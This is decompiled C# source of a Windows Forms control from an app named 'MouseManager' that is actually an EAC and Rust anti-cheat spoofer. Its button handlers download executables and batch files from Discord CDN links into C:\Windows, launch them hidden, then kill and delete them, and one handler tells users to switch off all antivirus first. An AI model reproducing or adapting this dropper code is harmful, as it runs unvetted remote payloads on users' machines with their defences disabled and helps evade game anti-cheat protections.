...
namespace MouseManager.UserControls
{
	...
	public class Profile2 : UserControl
	{
		// Token: 0x06000090 RID: 144 RVA: 0x001A8616 File Offset: 0x001A1016
		public Profile2()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000091 RID: 145 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void Profile2_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000092 RID: 146 RVA: 0x001B13BC File Offset: 0x001A9DBC
		...
		// Token: 0x06000093 RID: 147 RVA: 0x001B175C File Offset: 0x001AA15C
		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			...
			string fileName2 = "C:\\Windows\\CleanerSecond.exe";
			string fileName3 = "C:\\Windows\\Apex_Cleaner_2.bat";
			...
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899048530289766411/CleanerSecond.exe", fileName2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/899006209506566234/899049004350971954/Apex_Cleaner_2.bat", fileName3);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
		...
		// Token: 0x06000094 RID: 148 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000095 RID: 149 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel14_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000096 RID: 150 RVA: 0x001A824D File Offset: 0x001A0C4D
		private void siticoneHtmlLabel6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000097 RID: 151 RVA: 0x001B18F8 File Offset: 0x001AA2F8
		private void siticoneButton2_Click(object sender, EventArgs e)
		{
			...
			MessageBox.Show("IF  FAILS MAKE SHURE U HAVE ALL ANTI VIRUS TURNED OFF !!,your session will close after the process let it do so !!! .Important Message");
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\SPOOFER.exe";
			string text2 = "C:\\Windows\\C.exe";
			string fileName = "C:\\Windows\\C2.exe";
			string fileName2 = "C:\\Windows\\logoff.exe";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/901383697176092742/901384242108440607/SPOOFER.exe", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/901383697176092742/901384258281680936/CleanerFirst.exe", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/901383697176092742/901384261016375356/CleanerSecond.exe", fileName);
			...
			Process.Start(text);
			Thread.Sleep(10000);
			Process.Start("cmd.exe", "/c taskkill /F /IM SPOOFER.exe /T");
			Thread.Sleep(1000);
			File.Delete(text);
			Process.Start(text2);
			Thread.Sleep(10000);
			Process.Start("cmd.exe", "/c taskkill /F /IM C.exe /T");
			Thread.Sleep(1000);
			File.Delete(text2);
		}

		// Token: 0x06000098 RID: 152 RVA: 0x001B1A74 File Offset: 0x001AA474
		...
		// Token: 0x06000099 RID: 153 RVA: 0x001A862A File Offset: 0x001A102A
		...
		// Token: 0x0600009A RID: 154 RVA: 0x001B1E0C File Offset: 0x001AA80C
		private void InitializeComponent()
		{
			...
			this.siticoneHtmlLabel5.Location = new Point(218, 12);
			this.siticoneHtmlLabel5.Name = "siticoneHtmlLabel5";
			this.siticoneHtmlLabel5.Size = new Size(84, 26);
			this.siticoneHtmlLabel5.TabIndex = 22;
			this.siticoneHtmlLabel5.Text = "EAC Spoofer";
			...
			this.siticoneButton4.ForeColor = Color.Lime;
			...
			this.siticoneButton4.Location = new Point(12, 209);
			this.siticoneButton4.Name = "siticoneButton4";
			this.siticoneButton4.ShadowDecoration.Parent = this.siticoneButton4;
			this.siticoneButton4.Size = new Size(247, 35);
			this.siticoneButton4.TabIndex = 38;
			this.siticoneButton4.Text = "Start EAC Spoofer";
			...
			this.siticoneButton1.Location = new Point(284, 209);
			...
			this.siticoneHtmlLabel6.Location = new Point(254, 86);
			this.siticoneHtmlLabel6.Name = "siticoneHtmlLabel6";
			this.siticoneHtmlLabel6.Size = new Size(97, 21);
			this.siticoneHtmlLabel6.TabIndex = 53;
			this.siticoneHtmlLabel6.Text = "Not Required Now.";
			this.siticoneHtmlLabel6.Click += this.siticoneHtmlLabel6_Click;
			...
			this.siticoneHtmlLabel14.Location = new Point(122, 86);
			this.siticoneHtmlLabel14.Name = "siticoneHtmlLabel14";
			this.siticoneHtmlLabel14.Size = new Size(103, 21);
			this.siticoneHtmlLabel14.TabIndex = 52;
			this.siticoneHtmlLabel14.Text = "Windows Reinstall:";
			this.siticoneHtmlLabel14.Click += this.siticoneHtmlLabel14_Click;
			...
			this.Value1.Location = new Point(133, 44);
			this.Value1.Name = "Value1";
			this.Value1.Size = new Size(274, 31);
			this.Value1.TabIndex = 50;
			this.Value1.Text = "EAC Spoofer System configuration";
			...
			this.siticoneButton2.Location = new Point(64, 265);
			this.siticoneButton2.Name = "siticoneButton2";
			this.siticoneButton2.ShadowDecoration.Parent = this.siticoneButton2;
			this.siticoneButton2.Size = new Size(195, 35);
			this.siticoneButton2.TabIndex = 62;
			this.siticoneButton2.Text = "Start Spoof RUST";
			...
			this.siticoneButton3.BorderColor = Color.White;
			this.siticoneButton3.BorderRadius = 16;
			this.siticoneButton3.BorderThickness = 2;
			this.siticoneButton3.CheckedState.BorderColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton3.CheckedState.FillColor = Color.FromArgb(3, 169, 244);
			this.siticoneButton3.CheckedState.ForeColor = Color.Black;
			...
			this.siticoneButton3.FillColor = Color.FromArgb(33, 33, 33);
			this.siticoneButton3.Font = new Font("Bahnschrift", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.siticoneButton3.ForeColor = Color.White;
			this.siticoneButton3.HoverState.FillColor = Color.White;
			this.siticoneButton3.HoverState.ForeColor = Color.Black;
			this.siticoneButton3.HoverState.Parent = this.siticoneButton3;
			this.siticoneButton3.Location = new Point(284, 265);
			this.siticoneButton3.Name = "siticoneButton3";
			this.siticoneButton3.ShadowDecoration.Parent = this.siticoneButton3;
			this.siticoneButton3.Size = new Size(195, 35);
			this.siticoneButton3.TabIndex = 63;
			this.siticoneButton3.Text = "Start Spoof RUST 2 BETA";
